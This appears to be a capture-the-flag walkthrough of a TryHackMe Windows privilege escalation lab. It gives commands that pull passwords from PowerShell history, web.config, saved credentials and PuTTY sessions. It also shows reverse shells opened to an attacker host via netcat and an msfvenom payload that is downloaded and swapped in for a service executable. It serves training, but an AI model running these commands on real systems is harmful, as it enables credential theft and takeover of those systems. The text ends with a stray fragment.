# Windows Privilege Escalation

**Room Link:** [https://tryhackme.com/room/windowsprivesc20](https://tryhackme.com/room/windowsprivesc20)



## Harvesting Passwords from Usual Spots

**A password for the julia.jones user has been left on the Powershell history. What is the password?**

**Victim(cmd)**

```
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

**A web server is running on the remote host. Find any interesting password on web.config files associated with IIS. What is the password of the db\_admin user?**

**Victim(cmd)**

```
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

**There is a saved password on your Windows credentials. Using cmdkey and runas, spawn a shell for mike.katz and retrieve the flag from his desktop.**

**Victim(cmd)**

```
cmdkey /list
runas /savecred /user:WPRIVESC1\mike.katz cmd.exe
```

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

**Retrieve the saved password stored in the saved PuTTY session under your profile. What is the password for the thom.smith user?**

**Victim(cmd)**

```
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

## Other Quick Wins

**What is the taskusr1 flag?**

**Victim(cmd)**

```
schtasks /query /tn vulntask /fo list /v
```

<figure><img src="../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>

**Victim(cmd)**

```
icacls c:\tasks\schtask.bat
```

**Victim(cmd)**

```
icacls c:\tasks\schtask.bat
```

<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
nc -lvnp 4444
```

**Victim**

```
echo c:\tools\nc64.exe -e cmd.exe $KALI 4444 > C:\tasks\schtask.bat
schtasks /run /tn vulntask
```

<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

## Abusing Service Misconfigurations



**Victim(cmd)**

```
sc qc WindowsScheduler
```

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

**Victim(cmd)**

```
icacls C:\PROGRA~2\SYSTEM~1\WService.exe
```

<figure><img src="../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KALI LPORT=4445 -f exe-service -o rev-svc.exe
python2 -m SimpleHTTPServer 81
```

**Victim(Powershell)**

```
wget http://$KALI:81/rev-svc.exe -O rev-svc.exe
```

Once the payload is in the Windows server, we proceed to replace the service executable with our payload. Since we need another user to execute our payload, we'll want to grant full permissions to the Everyone group as well.

**Victim(Powershell)**

```
cd C:\PROGRA~2\SYSTEM~1\
move WService.exe WService.exe.bkp
move C:\Users\thm-unpriv\rev-svc.exe WService.exe
icacls WService.exe /grant Everyone:F
```

**Kali**

```
nc -lvp 4445
```

**Note:** PowerShell has sc as an alias to Set-Content, therefore you need to use sc.exe in order to control services with PowerShell this way.

As a result, you'll get a reverse shell with svcusr1 privileges:

**Victim(cmd)**

```
sc stop windowsscheduler
sc start windowsscheduler
```

**OR**

**Victim(Powershell)**

```
sc.exe stop windowsscheduler
sc.exe  start windowsscheduler
```

<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

****

****

**Victim(Powershell)**

```
c
```

























